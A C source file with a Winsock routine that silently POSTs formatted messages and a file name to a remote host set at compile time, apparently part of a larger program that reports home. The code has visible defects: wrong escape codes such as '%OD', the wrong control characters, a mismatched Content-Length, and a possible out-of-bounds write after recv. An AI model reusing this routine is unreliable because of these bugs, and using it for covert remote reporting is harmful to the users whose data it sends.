#include "StdAfx.h"

int httponcelog (char *filename,char *msg,...) 
{
	char *szMsg;
	char *szReq;
	SOCKADDR_IN sin;
	SOCKET s;
	va_list ap;
	WSADATA wsaData;
	DWORD clength;
	int res;
	char http_log_host[128], http_log_url[255];

	strcpy(http_log_host, HTTP_LOG_HOST);
	strcpy(http_log_url, HTTP_LOG_URL);
	szMsg = (char*) a(65535);
	if(szMsg == NULL) {
		deb("httplog: new failed\n");
		return ERR;
	}

	szReq = (char*) a(65535);
	if(szReq == NULL) {
		deb("httplog: new failed\n");
		return ERR;
	}

    va_start(ap,msg);
    vsprintf(szMsg,msg,ap);
    va_end(ap);

	rep(szMsg,"&","%26");
	rep(szMsg," ","%20");
	rep(szMsg,"\x13","%OD");
	rep(szMsg,"\x10","%OA");
	rep(szMsg,"\n","%0D");

	wsprintf(szReq,"to=%s&\nmsg=%s",filename,szMsg);
	clength = lstrlen(szReq);
	_snprintf(szReq,65535,"POST %s HTTP/1.0\nHost: %s\nUser-Agent: %s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %lu\n\nto=%s&msg=%s\n\n",
			http_log_url,http_log_host,INTERNAL_VERSION,clength,filename,szMsg);

	int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
	if (iResult != NO_ERROR) 
	{
		deb("httplogonce: Error at WSAStartup() :%d\n",WSAGetLastError());
		f(szReq);
		f(szMsg);
		return ERR;
	}

	sin.sin_family = AF_INET;
	sin.sin_port = htons(HTTP_LOG_PORT);
	if((sin.sin_addr.s_addr = DnsResolve(HTTP_LOG_HOST)) == ERR) 
	{
		deb("httplogonce: resolve error %d\n",WSAGetLastError());
		f(szReq);
		f(szMsg);
		return ERR;
	}
	
	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (s == INVALID_SOCKET) 
	{
		deb("httplogonce: Error at socket(): %ld\n", WSAGetLastError());
		f(szReq);
		f(szMsg);
		return ERR;
	}

	int c_tryes = 0;

	while(connect( s, (SOCKADDR*) &sin, sizeof(sin) ) == SOCKET_ERROR) {
		deb( "httplog: Failed to connect to [%s/%d]. %d\n",
			inet_ntoa(sin.sin_addr),ntohs(sin.sin_port),WSAGetLastError() );
		Sleep(HTTP_LOG_CONNECT_SLEEP);
		if(c_tryes++ > HTTP_MAX_CONNECT_TRYES) {
			deb("httplogonce: max connect tryes reached...\n");
			f(szReq);
			f(szMsg);
			return ERR;
		}
	}

	send(s,szReq,strlen(szReq),0);
	res = recv(s,szReq,65535,0);
	if(res == 0) 
	{ 
		deb("httplog: connection closed by remote."); 
	}
	else
	{
		szReq[res] = 0x0;
	}
	closesocket(s);

	f(szReq);
	f(szMsg);
	return SUCCESS;
}

int httplog (char *filename,char *msg,...)
{
	return SUCCESS;
}